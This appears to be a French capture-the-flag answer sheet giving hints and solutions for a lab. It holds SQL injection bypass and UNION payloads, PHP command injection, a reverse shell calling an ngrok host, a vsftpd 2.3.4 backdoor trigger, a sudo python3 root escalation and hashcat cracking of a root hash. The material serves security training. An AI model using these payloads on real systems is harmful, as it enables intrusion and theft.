# Injection SQL 1 - Passer le login

mettre " pour avoir une erreur


* Solution :
    Mettre en username : " OR 1=1 OR ""="

Mais on est login en tant que "admin", pas l'autre user !

* Indice 1 :
    Injection SQL

* Indice 2 : 
    SELECT * FROM data.users WHERE username = "$username" AND password="$password"

# Injection SQL 2 - Récupérer le mot de passe de l'autre utilisateur

* Indice 1 : 
    SELECT * FROM data.users WHERE username = "$username" AND password="$password"
    (dur sans connaître le nom de la base !)

SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin"

* Solution :

    Mettre en user : (n'importe quoi)

    Mettre en mdp : " UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin

# RCE PHP - Ping

* Solution :

    ;ls
    ;whoami

reverse shell : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

nc -l -p 12345 

ngrok tcp 12345

php -r '$sock=fsockopen("2.tcp.ngrok.io",15705);exec("/bin/sh -i <&3 >&3 2>&3");'

upgrade : 
python3 -c 'import pty;pty.spawn("/bin/bash")';

# vstfp:2.3.4 backdoor

* Solution :

    ftp 10.1.0.188

    Connected to 10.1.0.188.
    220 (vsFTPd 2.3.4)
    Name (10.1.0.188:root): ANYTHINGHERE:)
    331 Please specify the password.
    Password:
    ^C
    421 Service not available, remote server has closed connection


    nc -vn 10.1.0.188 6200

    Connection to 10.1.0.188 6200 port \[tcp/*\] succeeded!


    ls ~

    flag.txt


    cat ~/flag.txt


# PrivEsc : Sudo
sudo -l

User www-data may run the following commands on machine1:
    (root) NOPASSWD: /usr/bin/python3

* Solution :
    sudo python3 -c "import os;os.system('whoami')"
    sudo python3 -c "import os;os.system('bash')"

# Hash root
ls ~

pense_bete.txt

cat ~/pense_bete.txt

Pense-bête pour le mdp root de l'autre machine:

dc15d3f5ab9656bc55f7a2f5d1e3a0a5

* Solution :

    hashcat -m0 -O flag /usr/share/wordlists/rockyou.txt

    (hashcat -m0 --show flag)